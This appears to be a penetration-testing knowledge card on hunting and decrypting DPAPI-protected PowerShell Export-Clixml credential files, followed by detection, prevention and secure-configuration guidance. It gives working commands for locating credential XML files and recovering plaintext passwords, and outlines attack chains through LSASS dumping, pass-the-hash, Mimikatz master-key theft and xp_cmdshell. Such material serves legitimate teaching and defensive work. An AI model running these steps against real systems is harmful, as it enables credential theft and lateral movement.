notes:
=== PowerShell CLIXML — DPAPI-Protected Credential Decryption ===
Export-Clixml stores PSCredential objects encrypted with DPAPI — decrypt in the owning user's context.

=== HOW CLIXML CREDENTIALS WORK ===
Export-Clixml saves a PSCredential as an XML file with the password encrypted via DPAPI.
DPAPI ties encryption to: current user's Windows credentials + current machine.
The file can ONLY be decrypted by the same user account on the same machine where it was created.
Common use: admin scripts automating connections to vCenter, SQL, WinRM, cloud platforms.

=== DECRYPTION (after gaining code execution as the owning user) ===
$cred = Import-Clixml -Path C:\scripts\svc_cred.xml
$cred.UserName
$cred.GetNetworkCredential().Password

Single-line:
  (Import-Clixml C:\scripts\pass.xml).GetNetworkCredential().Password

=== FINDING CLIXML FILES ===
Get-ChildItem -Path C:\ -Recurse -Include *.xml -ErrorAction SilentlyContinue | Select-String "PSCredential" | Select-Object Filename
findstr /SIM /C:"PSCredential" *.xml

Common storage locations:
  C:\scripts\*, C:\tools\*, C:\Windows\System32\WindowsPowerShell\*, scheduled task directories

=== IDENTIFYING THE OWNING USER ===
Get-Acl <file.xml> | Select-Object Owner  → shows who created/owns the file
The DPAPI key is specific to the creator's account — need their session to decrypt
If already running as that user → decrypt immediately
If not → need to impersonate them (token theft after LSASS dump)

=== CHAINING CONTEXT ===
Found pass.xml owned by svc_backup → need svc_backup session to decrypt
LSASS dump → svc_backup hash → pass-the-hash → code exec as svc_backup → decrypt XML
PSCredential for vCenter → credentials for VMware infrastructure → clone DC VMs
PSCredential for SQL → xp_cmdshell → SYSTEM on SQL server → lateral movement

=== WHAT TO LOOK FOR ===
*.xml files containing <SS SS="" N="Password"> or PSCredential pattern
Admin scripts in C:\scripts\ or task scheduler directories
Service accounts that run automated scripts — their credentials are often stored as CLIXML
DPAPI master key theft (via Mimikatz dpapi::masterkey) can bypass the user-context requirement

recommended.note: History often shows where the pass.xml lives.

name: Credential Hunting - Decrypt Export-Clixml Secrets
description: PSCredential objects saved with Export-Clixml are DPAPI-encrypted to the saving user. Running as that user, import the file and read the plaintext username/password.

defense.why_it_works: PowerShell's Export-Clixml encrypts credentials using DPAPI with the current user's Windows identity as the key. The encrypted credential can only be decrypted by the same user on the same (or domain-joined equivalent) machine via Import-Clixml. An attacker running as the same user can call GetNetworkCredential().Password to decrypt and retrieve the plaintext password.
defense.prerequisites: Running as the same user who created the credential export. Access to the .xml credential file (commonly in script directories or SYSVOL). PowerShell execution.
defense.impact: Plaintext recovery of credentials stored in DPAPI-encrypted PowerShell export files, enabling authentication as the service account or administrator whose credential was exported.
defense.detection: Import-Clixml followed by GetNetworkCredential().Password in PowerShell transcript logs. Unusual PowerShell script execution. SIEM: detection of Get-Credential / Export-Clixml / Import-Clixml patterns in scripts accessible to broad audiences.
defense.artifacts: PowerShell transcript: Import-Clixml and GetNetworkCredential calls | Script file containing the decryption pattern | Audit: .xml credential file access
defense.prevention: Do not store DPAPI-encrypted credentials in scripts on shared drives (SYSVOL, network shares) — they are decryptable by anyone running as that user. Use managed identities (Azure MSI), service principals with certificate auth, or secrets managers (HashiCorp Vault). Restrict script directories.
defense.misconfiguration: IT scripts store credential XML files in SYSVOL or shared network paths accessible to other domain users. Script decrypts DPAPI-protected credential and uses it inline, meaning any user who can run the script as the target user recovers the password.
defense.vulnerable_config:
# Vulnerable script pattern:
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
# If attacker runs this as the user who exported it: plaintext recovered
defense.secure_config:
# Replace DPAPI credential exports with managed identities or secret stores
# Azure: Use Managed Identity / Key Vault references
# On-prem: Use Windows GMSA (Group Managed Service Accounts)
New-ADServiceAccount -Name gMSASvc -DNSHostName dc01.inlanefreight.local

# If DPAPI export required: restrict access to script dir
icacls C:\scripts /inheritance:r /grant 'CREATOR OWNER:(OI)(CI)F'
